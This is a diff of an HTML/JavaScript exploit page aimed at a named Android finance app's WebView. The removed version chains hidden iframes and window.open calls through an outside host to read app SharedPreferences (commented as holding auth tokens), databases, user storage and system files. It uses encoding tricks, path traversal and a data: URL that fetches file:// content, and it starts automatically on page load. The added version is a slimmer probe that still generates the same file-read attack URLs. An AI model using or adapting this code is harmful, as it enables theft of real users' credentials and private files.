@@ -1,209 +1,155 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Local File Read Exploit</title>
+    <title>Simple Exploit Test</title>
+    <meta charset="UTF-8">
     <style>
-        body { font-family: Arial; padding: 20px; background: #000; color: #00ff00; }
-        .result { border: 2px solid #ff0000; padding: 15px; margin: 10px 0; background: #111; }
-        button { background: #ff0000; color: white; padding: 15px; border: none; margin: 5px; cursor: pointer; }
-        pre { background: #222; color: #fff; padding: 10px; overflow-x: auto; }
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+            background-color: #000;
+            color: #00ff00;
+        }
+        .test {
+            background-color: #111;
+            border: 2px solid #ff0000;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 5px;
+        }
+        button {
+            background-color: #ff0000;
+            color: white;
+            padding: 15px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 10px;
+            font-size: 16px;
+        }
+        pre {
+            background-color: #222;
+            color: #fff;
+            padding: 10px;
+            border-radius: 3px;
+            overflow-x: auto;
+        }
     </style>
 </head>
 <body>
-    <h1>🔓 Local File Read Exploit</h1>
-    <p>Testing local file access via isHtmlView=true&htmlFilePath=</p>
+    <h1>🔓 Simple Exploit Tests</h1>
     
-    <button onclick="readAppFiles()">📱 Read App Files</button>
-    <button onclick="readSystemFiles()">⚙️ Read System Files</button>
-    <button onclick="readUserFiles()">👤 Read User Files</button>
-    <button onclick="readDatabaseFiles()">💾 Read Database Files</button>
+    <div class="test">
+        <h2>Test 1: File Download</h2>
+        <p>Testing if downloadType=DOWNLOAD works</p>
+        <button onclick="testDownload()">🔽 Test Download</button>
+        <div id="downloadResult"></div>
+    </div>
     
-    <div id="results"></div>
+    <div class="test">
+        <h2>Test 2: File Read</h2>
+        <p>Testing if isHtmlView + htmlFilePath works</p>
+        <button onclick="testFileRead()">📖 Test File Read</button>
+        <div id="fileResult"></div>
+    </div>
+    
+    <div class="test">
+        <h2>Current URL Info</h2>
+        <pre id="urlInfo"></pre>
+    </div>
 
     <script>
-        function addResult(title, content) {
-            const div = document.createElement('div');
-            div.className = 'result';
-            div.innerHTML = `<h3>${title}</h3><div>${content}</div>`;
-            document.getElementById('results').appendChild(div);
+        // Show current URL and parameters
+        function showURLInfo() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const info = {
+                currentURL: window.location.href,
+                isHtmlView: urlParams.get('isHtmlView'),
+                htmlFilePath: urlParams.get('htmlFilePath'),
+                downloadType: urlParams.get('downloadType')
+            };
+            document.getElementById('urlInfo').textContent = JSON.stringify(info, null, 2);
         }
-
-        function readAppFiles() {
-            console.log("Attempting to read app files...");
+        
+        function testDownload() {
+            console.log("Testing download functionality...");
             
-            const appFiles = [
-                "/android_asset/config.json",
-                "/android_asset/cd-offer-details.json", 
-                "/android_asset/dashboard_response_mocked.json",
-                "/data/data/in.groww.dash/shared_prefs/",
-                "/data/data/in.groww.dash/files/",
-                "/data/data/in.groww.dash/cache/"
-            ];
+            // Try to trigger a download
+            const downloadURL = "https://juzjk6379.xyz/test-file.txt?downloadType=DOWNLOAD";
             
-            appFiles.forEach((file, index) => {
-                setTimeout(() => {
-                    const readUrl = `https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/local_file_read.html&isHtmlView=true&htmlFilePath=${encodeURIComponent(file)}`;
-                    
-                    const iframe = document.createElement('iframe');
-                    iframe.style.display = 'none';
-                    iframe.src = readUrl;
-                    document.body.appendChild(iframe);
-                    
-                    console.log(`Attempting to read: ${file}`);
-                    
-                    setTimeout(() => {
-                        try { document.body.removeChild(iframe); } catch(e) {}
-                    }, 5000);
-                }, index * 1000);
-            });
+            // Method 1: iframe
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = downloadURL;
+            document.body.appendChild(iframe);
             
-            addResult("📱 App Files", "Attempting to read application files and configs");
+            // Method 2: window.location
+            setTimeout(() => {
+                window.location.href = downloadURL;
+            }, 2000);
+            
+            document.getElementById('downloadResult').innerHTML = 
+                `<p>✅ Triggered download test</p><p>URL: ${downloadURL}</p>`;
         }
-
-        function readSystemFiles() {
-            console.log("Attempting to read system files...");
+        
+        function testFileRead() {
+            console.log("Testing file read functionality...");
             
-            const systemFiles = [
-                "/proc/version",
-                "/system/build.prop",
-                "/proc/cpuinfo",
-                "/proc/meminfo",
-                "/etc/hosts",
-                "/proc/net/arp"
-            ];
+            // Check if we're in HTML view mode
+            const urlParams = new URLSearchParams(window.location.search);
+            const isHtmlView = urlParams.get('isHtmlView');
+            const htmlFilePath = urlParams.get('htmlFilePath');
             
-            systemFiles.forEach((file, index) => {
-                setTimeout(() => {
-                    // Try direct file:// access through htmlFilePath
-                    const readUrl = `https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/local_file_read.html&isHtmlView=true&htmlFilePath=file://${file}`;
-                    
-                    window.open(readUrl, `_blank_${index}`);
-                    console.log(`Attempting to read: ${file}`);
-                }, index * 1500);
-            });
-            
-            addResult("⚙️ System Files", "Attempting to read system configuration files");
-        }
-
-        function readUserFiles() {
-            console.log("Attempting to read user files...");
-            
-            const userFiles = [
-                "/storage/emulated/0/Download/",
-                "/storage/emulated/0/Documents/",
-                "/storage/emulated/0/Pictures/",
-                "/storage/emulated/0/Android/data/in.groww.dash/",
-                "/sdcard/Android/data/in.groww.dash/files/"
-            ];
-            
-            userFiles.forEach((file, index) => {
-                setTimeout(() => {
-                    const readUrl = `https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/local_file_read.html&isHtmlView=true&htmlFilePath=${encodeURIComponent(file)}`;
-                    
-                    // Try both iframe and direct navigation
-                    const iframe = document.createElement('iframe');
-                    iframe.style.display = 'none';
-                    iframe.src = readUrl;
-                    document.body.appendChild(iframe);
-                    
-                    console.log(`Attempting to read: ${file}`);
-                }, index * 800);
-            });
-            
-            addResult("👤 User Files", "Attempting to read user storage and app data");
-        }
-
-        function readDatabaseFiles() {
-            console.log("Attempting to read database files...");
-            
-            const dbFiles = [
-                "/data/data/in.groww.dash/databases/",
-                "/data/data/in.groww.dash/shared_prefs/com.groww.dash_preferences.xml",
-                "/data/data/in.groww.dash/shared_prefs/encrypted_prefs.xml",
-                "/data/data/in.groww.dash/files/user_data.json"
-            ];
-            
-            dbFiles.forEach((file, index) => {
-                setTimeout(() => {
-                    // Multiple attack vectors for database access
-                    const methods = [
-                        `https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/local_file_read.html&isHtmlView=true&htmlFilePath=${encodeURIComponent(file)}`,
-                        `https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/local_file_read.html&isHtmlView=true&htmlFilePath=file://${file}`,
-                        `https://credit.groww.in/pl/permission-screen?webViewUrl=data:text/html,<script>fetch('file://${file}').then(r=>r.text()).then(console.log)</script>`
-                    ];
-                    
-                    methods.forEach((method, methodIndex) => {
-                        setTimeout(() => {
-                            const iframe = document.createElement('iframe');
-                            iframe.style.display = 'none';
-                            iframe.src = method;
-                            document.body.appendChild(iframe);
-                            
-                            console.log(`DB access method ${methodIndex + 1}: ${file}`);
-                        }, methodIndex * 500);
-                    });
-                }, index * 2000);
-            });
-            
-            addResult("💾 Database Files", "Attempting to read app databases and preferences");
-        }
-
-        // Enhanced file read with different techniques
-        function enhancedFileRead() {
-            const sensitiveFiles = [
-                // SharedPreferences (contains auth tokens!)
-                "/data/data/in.groww.dash/shared_prefs/com.groww.dash_preferences.xml",
-                "/data/data/in.groww.dash/shared_prefs/encrypted_prefs.xml", 
-                
-                // App config files
-                "/android_asset/cd-offer-details.json",
-                "/android_asset/dashboard_response_mocked.json",
-                
-                // Potential log files
-                "/data/data/in.groww.dash/files/logs/",
-                "/storage/emulated/0/Android/data/in.groww.dash/files/"
-            ];
-            
-            sensitiveFiles.forEach(file => {
-                // Try multiple encoding techniques
-                const encodedFile = encodeURIComponent(file);
-                const doubleEncodedFile = encodeURIComponent(encodedFile);
-                
-                const attackUrls = [
-                    `https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/local_file_read.html&isHtmlView=true&htmlFilePath=${encodedFile}`,
-                    `https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/local_file_read.html&isHtmlView=true&htmlFilePath=${doubleEncodedFile}`,
-                    `https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/local_file_read.html&isHtmlView=true&htmlFilePath=../${encodedFile}`,
-                    `https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/local_file_read.html&isHtmlView=true&htmlFilePath=file://${file}`
+            if (isHtmlView === 'true' && htmlFilePath) {
+                document.getElementById('fileResult').innerHTML = 
+                    `<p>🎯 HTML View Mode Detected!</p>
+                     <p>Attempting to read: ${htmlFilePath}</p>
+                     <p>This would execute if file exists and is readable</p>`;
+            } else {
+                // Generate test URLs for file reading
+                const testFiles = [
+                    "/android_asset/cd-offer-details.json",
+                    "/data/data/in.groww.dash/shared_prefs/encrypted_prefs.xml"
                 ];
                 
-                attackUrls.forEach(url => {
-                    const iframe = document.createElement('iframe');
-                    iframe.style.display = 'none';
-                    iframe.src = url;
-                    document.body.appendChild(iframe);
+                let testURLs = testFiles.map(file => {
+                    const encodedFile = encodeURIComponent(file);
+                    return `https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/simple_test.html?isHtmlView=true%26htmlFilePath=${encodedFile}`;
                 });
-            });
+                
+                document.getElementById('fileResult').innerHTML = 
+                    `<p>📋 Test URLs generated:</p>
+                     <p style="font-size:12px; word-break:break-all;">${testURLs.join('<br><br>')}</p>`;
+            }
         }
-
-        // Auto-start with most promising targets
+        
+        // Auto-run when page loads
         window.addEventListener('load', function() {
-            setTimeout(() => {
-                console.log("Auto-starting file read tests...");
-                
-                // Test most likely to work: app assets
-                const testFile = "/android_asset/cd-offer-details.json";
-                const readUrl = `https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/local_file_read.html&isHtmlView=true&htmlFilePath=${encodeURIComponent(testFile)}`;
-                
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.src = readUrl;
-                document.body.appendChild(iframe);
-                
-                addResult("🚀 Auto Test", `Attempting to read: ${testFile}`);
-                
-                // Try enhanced techniques
-                setTimeout(() => enhancedFileRead(), 3000);
-            }, 2000);
+            showURLInfo();
+            
+            // Auto-test if we have parameters
+            const urlParams = new URLSearchParams(window.location.search);
+            
+            if (urlParams.get('downloadType') === 'DOWNLOAD') {
+                console.log("🔽 Download mode detected!");
+                document.body.innerHTML = `
+                    <h1>🔽 DOWNLOAD TEST ACTIVE</h1>
+                    <p>If you see this, the download trigger worked!</p>
+                    <p>Current URL: ${window.location.href}</p>
+                `;
+            }
+            
+            if (urlParams.get('isHtmlView') === 'true') {
+                console.log("📖 HTML View mode detected!");
+                const filePath = urlParams.get('htmlFilePath');
+                document.body.innerHTML = `
+                    <h1>📖 FILE READ TEST ACTIVE</h1>
+                    <p>HTML View Mode: ${urlParams.get('isHtmlView')}</p>
+                    <p>File Path: ${filePath}</p>
+                    <p>If you see this, the file read mechanism is working!</p>
+                    <p>The actual file content would be loaded here if accessible.</p>
+                `;
+            }
         });
     </script>
 </body>
